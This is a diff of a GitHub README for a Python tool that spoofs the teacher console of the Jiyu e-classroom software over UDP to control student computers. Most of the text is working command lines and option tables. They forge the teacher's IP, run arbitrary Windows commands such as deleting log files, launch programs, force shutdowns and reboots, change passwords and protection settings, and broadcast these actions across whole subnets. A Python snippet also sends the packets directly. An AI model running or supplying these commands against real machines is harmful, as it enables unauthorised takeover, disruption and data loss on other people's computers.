@@ -2,7 +2,7 @@
 
 [![GitHub release](https://img.shields.io/github/release/weilycoder/Jiyu_replay_attack.svg)](https://github.com/weilycoder/Jiyu_replay_attack/releases/latest)
 
-利用极域电子教室的 udp 包攻击学生机。
+利用极域电子教室的 UDP 协议伪装教师端，向学生机发送控制指令。
 
 对这方面技术的了解来自 [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_attack/)。
 
@@ -10,171 +10,181 @@
 
 ## Environment
 
-项目的最新版向下兼容到 Python 3.8。
-
-重新使用了 Python 第三方库 `scapy` 作为依赖，同时，您可能还需要下载 Npcap 或 WinPcap。
+- Python >= 3.8，< 4
+- `scapy`（数据包构造与发送）
+- `psutil`（本地 UDP 端口检测）
+- 需要安装 Npcap 或 WinPcap（用于 scapy 发送原始套接字）
 
 项目针对极域电子教室 2016 版开发，不保证所有操作对其他版本有效。
 
 如果你希望我针对其他版本开发，请为我提供该版本有效的教师端和学生端下载程序。
 
+## Installation
+
+本项目使用 Poetry 进行依赖管理： 
+
+```
+pip install poetry
+poetry install
+```
+
+或直接使用 pip：
+
+```
+pip install scapy psutil
+```
+
 ## Usage
 
-你可以从 Python 导入 `Jiyu_replay_attack` 模块，也可以使用命令行 `python Jiyu_replay_attack`。
-
-使用 `python Jiyu_replay_attack -h` 来获取帮助信息：
-
-```
-usage: Jiyu_replay_attack [-h] [-f <ip>] [-fp <port>] [-t [<ip> ...]] [-tp <port>]
-                       [-i <ip_id>] [-m <msg> | -w <url> | -c <command> |
-                       -e <program> [<args> ...] |
-                       -s [<timeout> [<message> ...]] |
-                       -r [<timeout> [<message> ...]] |
-                       -cw [<timeout> [<message> ...]] | -ctw |
-                       -n <name> <name_id> | --setting [<setting-args>] |
-                       --hex <hex_data> | --pkg <custom_data> [<args> ...]]
-
-Jiyu Attack Script
-
-Github Repositories: https://github.com/weilycoder/Jiyu_replay_attack/tree/main/ 
-
-options:
-  -h, --help            show this help message and exit
-
-Network Configuration:
-  Specify the network configuration for the attack.
-
-  -f, --teacher-ip <ip>
-                        Teacher's IP address
-  -fp, --teacher-port <port>
-                        Teacher's port (default to random port)
-  -t, --target [<ip> ...]
-                        Target IP address
-  -tp, --target-port <port>
-                        Port to send packets to (default: 4705)
-  -i, --ip-id <ip_id>   IP ID for the packet (default: random ID)
-
-Attack Action:
-  Specify the action to perform on the target machine. 
-
-  -m, --message <msg>   Send a message to the target machine
-  -w, --website <url>   Open a website on the target machine
-  -c, --command <command>
-                        Execute a command on the target machine
-                        (`cmd /D /C <command>`, Windows only)
-  -e, --execute, --minimize-execute, --maximize-execute <program> [<args> ...]
-                        Execute a program with arguments on the target machine
-  -s, --shutdown [<timeout> [<message> ...]]
-                        Shutdown the target machine,
-                        optionally with a timeout and message
-  -r, --reboot [<timeout> [<message> ...]]
-                        Reboot the target machine,
-                        optionally with a timeout and message
-  -cw, --close-windows [<timeout> [<message> ...]]
-                        Close all windows on the target machine
-  -ctw, --close-top-window
-                        Close the top window on the target machine
-  -n, --rename <name> <name_id>
-                        Rename the target machine
-  --setting [<setting-args>]
-                        Set specific settings on the target machine
-                        Use `Jiyu_replay_attack --setting` for help
-  --hex <hex_data>      Send raw hex data to the target machine
-  --pkg <custom_data> [<args> ...]
-                        Custom packet data to send
-
-Example usage:
-    python Jiyu_replay_attack -t 192.168.106.100 -m "Hello World"
-    python Jiyu_replay_attack -t 192.168.106.104 -w https://www.github.com
-    python Jiyu_replay_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000
-    python Jiyu_replay_attack -t 224.50.50.42 -e calc.exe
-    python Jiyu_replay_attack -t 224.50.50.42 --maximize-execute notepad.exe
-    python Jiyu_replay_attack -t 224.50.50.42 -s 60 "System is going to shutdown."
-    python Jiyu_replay_attack -t 192.168.106.105-120 -r 30 "Rebooting."
-    python Jiyu_replay_attack -t 192.168.106.255 -cw
-    python Jiyu_replay_attack -t 192.168.106.100 -ctw
-    python Jiyu_replay_attack -t 192.168.106.100 -n hacker 1000
-    python Jiyu_replay_attack -t 192.168.106.100 --hex 444d4f43000001002a020000
-    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"
-    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024
-    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{0}{1.size_8₀₀}" 4d hello
-    python Jiyu_replay_attack -t 192.168.106.1００ --pkg test.txt １０２４ hello
-    python Jiyu_replay_attack -t 127.0.0.1 --setting
+```bash
+python -m Jiyu_replay_attack <command> [options]
 ```
 
-### Specify the IP
+项目采用子命令结构，包含 `attack` 和 `detect` 两个子命令。
 
-对于目标 ip 的指定，可以：
+### `attack` — 攻击指令
 
-+ 指定具体 ip，如 `192.168.3.103`；
-+ 指定 ip 范围，如 `192.168.3.100-150`。
-
-最多指定 65536 个不同 ip。
-
-但是，进行广播时，更推荐的行为是：
-
-+ 指定广播地址，如 `192.168.3.255`；
-+ 指定 ip 段，如 `192.168.3.0/24`，这将被转换到广播地址 `192.168.3.255`；
-+ 使用极域的组播地址 `224.50.50.42`。
-
-### Specify the Port
-
-一般情况下，可以使用 `-tp` 指定端口，默认为 `4705`，这是 2016 版极域使用的端口。如果你使用的是其他版本的极域，可能需要指定其他端口。
-
-已经测试，对于 2020 版，需要使用 `4988` 端口。
-
-不过，也可以直接在 `-t` 中指定端口，例如 `-t 192.168.233.100:1234`，这样，在向该 ip 发送数据包时，将使用指定的端口。
-
-对于教师机的端口，暂时不支持该语法，只能使用 `-fp` 指定。
-
-### `--setting`
-
-由于 `--setting` 的配置过于复杂，程序将其的配置项传入另一个命令行解析器，帮助文档如下：
+执行各种攻击操作，需要指定目标 IP 和攻击动作。
 
 ```
-usage: Jiyu_replay_attack <main-args> --setting="[setting-options]"
-
-Specify settings for the target machine
-
-options:
-  -h, --help            show this help message and exit
-
-Network Configuration:
-  --network             Configure network settings on the target machine
-  --transmission_reliability <reliability>
-                        Set the transmission reliability level (default: medium)
-  --offline-lag-time-detection <time_ms>
-                        Set the offline lag time detection threshold in seconds (default: 10 ms)
-
-Audio Configuration:
-  --audio               Configure audio settings on the target machine
-  --playback-mute       Mute audio playback on the target machine
-  --recording-mute      Mute audio recording on the target machine
-  --playback-volume <volume>
-                        Set the audio playback volume (default: 80)
-  --recording-volume <volume>
-                        Set the audio recording volume (default: 80)
-
-Password Configuration:
-  --password            Configure password settings on the target machine
-  --password-value <password>
-                        Set the password for the target machine (default: empty)
-
-Other Settings:
-  --preventing-process-termination {disable,enable,auto}
-                        Set the process termination prevention mode (default: auto)
-  --lock-screen-when-maliciously-offline {disable,enable,auto}
-                        Set the lock screen mode when maliciously offline (default: auto)
-  --hide-the-setup-name-button {disable,enable,auto}
-                        Set the visibility of the setup name button (default: auto)
-
-Example usage:
-    python Jiyu_replay_attack -t 192.168.233.0/24 --setting=""
-    python Jiyu_replay_attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"
-    python Jiyu_replay_attack -t 192.168.233.0/24 --setting="--password --password-value 123456"
+python -m Jiyu_replay_attack attack [options]
 ```
 
-### `--pkg`
+**网络配置：**
+
+| 参数 | 说明 |
+|------|------|
+| `-f, --teacher-ip <ip>` | 教师端 IP 地址（伪造源 IP） |
+| `-fp, --teacher-port <port>` | 教师端端口（默认随机） |
+| `-t, --target <ip> [<ip> ...]` | 目标 IP 地址（支持 CIDR、范围、多目标） |
+| `-tp, --target-port <port>` | 目标端口（默认 4705，即极域 2016，极域 2020 为 4988） |
+| `-i, --ip-id <ip_id>` | IP 标识（默认随机） |
+
+**攻击动作（互斥，每次选择一个）：**
+
+| 参数 | 说明 |
+|------|------|
+| `-m, --message <msg>` | 向目标发送消息 |
+| `-w, --website <url>` | 强制打开指定网页 |
+| `-c, --command <command>` | 执行命令（`cmd /D /C <command>`，仅 Windows） |
+| `-e, --execute <program> [<args> ...]` | 执行程序（支持 `--minimize-execute`、`--maximize-execute`） |
+| `-s, --shutdown [<timeout> [<message> ...]]` | 关机（可设定时和消息） |
+| `-r, --reboot [<timeout> [<message> ...]]` | 重启（可设定时和消息） |
+| `-cw, --close-windows [<timeout> [<message> ...]]` | 关闭所有窗口 |
+| `-ctw, --close-top-window` | 关闭顶层窗口 |
+| `-n, --rename <name> <name_id>` | 重命名目标机器 |
+| `--setting [<setting-args>]` | 修改教师端设置（网络/音频/密码/安全等） |
+| `--hex <hex_data>` | 发送原始十六进制数据 |
+| `--pkg <custom_data> [<args> ...]` | 自定义数据包（支持格式字符串或文件） |
+
+使用 `--setting` 时可用的子选项：
+
+```
+--network                               启用网络配置
+--transmission_reliability              传输可靠性：low / medium（默认）/ high
+--offline-lag-time-detection            离线滞后检测时间（秒，默认 10）
+--audio                                 启用音频配置
+--playback-mute                         静音播放
+--recording-mute                        静音录制
+--playback-volume <vol>                 播放音量（默认 80）
+--recording-volume <vol>                录制音量（默认 80）
+--password                              启用密码
+--password-value <pwd>                  设置密码
+--preventing-process-termination        防进程终止：disable / enable / auto（默认）
+--lock-screen-when-maliciously-offline  恶意离线锁屏：disable / enable / auto（默认）
+--hide-the-setup-name-button            隐藏设置名称按钮：disable / enable / auto（默认）
+```
+
+### `detect` — 本地端口探测
+
+检测本机 UDP 监听端口，默认过滤极域学生端进程：
+
+```bash
+python -m Jiyu_replay_attack detect [<keyword> ...]
+```
+
+| 参数 | 说明 |
+|------|------|
+| `<keyword>` | 进程名关键词过滤（默认：`studentmain`） |
+| `--detect-format <format>` | 自定义输出格式，支持 `{ip}` `{port}` `{pid}` `{name}` |
+
+### 示例
+
+```bash
+# 向目标发送消息
+python -m Jiyu_replay_attack attack -t 192.168.106.100 -m "Hello World"
+
+# 强制打开网页
+python -m Jiyu_replay_attack attack -t 192.168.106.104 -w https://www.github.com
+
+# CIDR 范围 + 伪造教师 IP + 执行命令
+python -m Jiyu_replay_attack attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000
+
+# 最大化执行程序
+python -m Jiyu_replay_attack attack -t 224.50.50.42 --maximize-execute notepad.exe
+
+# 定时关机并显示消息
+python -m Jiyu_replay_attack attack -t 224.50.50.42 -s 60 "系统即将关机。"
+
+# IP 范围 + 重启
+python -m Jiyu_replay_attack attack -t 192.168.106.105-120 -r 30 "正在重启。"
+
+# 关闭所有窗口 / 关闭顶层窗口
+python -m Jiyu_replay_attack attack -t 192.168.106.255 -cw
+python -m Jiyu_replay_attack attack -t 192.168.106.100 -ctw
+
+# 重命名目标
+python -m Jiyu_replay_attack attack -t 192.168.106.100 -n hacker 1000
+
+# 发送原始十六进制数据
+python -m Jiyu_replay_attack attack -t 192.168.106.100 --hex 444d4f43000001002a020000
+
+# 自定义数据包（格式字符串）
+python -m Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{rand16.size_2}"
+python -m Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024
+python -m Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello
+
+# 从文件读取自定义包格式
+python -m Jiyu_replay_attack attack -t 192.168.106.100 --pkg test.txt 1024 hello
+
+# 修改教师端设置
+python -m Jiyu_replay_attack attack -t 127.0.0.1 --setting
+
+# 检测本地极域 UDP 端口
+python -m Jiyu_replay_attack detect
+
+# 自定义格式输出
+python -m Jiyu_replay_attack detect --detect-format "{ip}:{port}"
+```
+
+### IP 地址指定
+
+对于目标 IP 的指定，支持多种格式：
+
+- **具体 IP**：`192.168.3.103`
+- **IP 范围**：`192.168.3.100-150`（最多 65536 个不同 IP）
+- **CIDR 子网**：`192.168.3.0/24`（自动转换为广播地址 `192.168.3.255`）
+- **组播地址**：`224.50.50.42`（极域默认组播）
+- **带端口**：`192.168.233.100:1234`（在目标 IP 中直接指定端口，覆盖 `-tp`）
+
+### 端口说明
+
+- 极域 2016 版默认端口 `4705`（脚本默认）
+- 极域 2020 版默认端口 `4988`
+- 可使用 `-tp` 全局指定目标端口
+- 也可以在 `-t` 中为每个 IP 单独指定端口（如 `-t 192.168.233.100:1234`）
+- 教师端端口只能使用 `-fp` 指定
+
+### `--setting` 详细说明
+
+由于 `--setting` 的配置项较多，程序将其交给独立的参数解析器处理。使用时需将设置选项作为引号包裹的字符串传入，例如：
+
+```bash
+python -m Jiyu_replay_attack attack -t 192.168.233.0/24 --setting="--network --preventing-process-termination enable"
+python -m Jiyu_replay_attack attack -t 192.168.233.0/24 --setting="--password --password-value 123456"
+```
+
+### `--pkg` 详细说明
 
 `--pkg` 用于发送格式化的数据包，可以指定参数，首个参数作为格式化字符串，其余参数被应用于字符串的格式化。格式化字符串的内容为 16 进制编码的数据包，因此需要保证应用格式化后字符串为合法的 16 进制编码串。
 
@@ -203,6 +213,17 @@ Example usage:
   + `{rand16.size_<size>}`：生成 `<size>` 个随机字节。
 
 注意，`rand16` 的返回值为 `str`，而非 `HexStr`。
+
+## Import as Module
+
+你也可以在 Python 代码中导入使用：
+
+```python
+from Jiyu_replay_attack import send_packet, broadcast_packet, pkg_message, pkg_shutdown
+
+payload = pkg_message("Hello World")
+send_packet("192.168.1.1", None, "192.168.1.100", 4705, payload)
+```
 
 ## Jiyu API
 
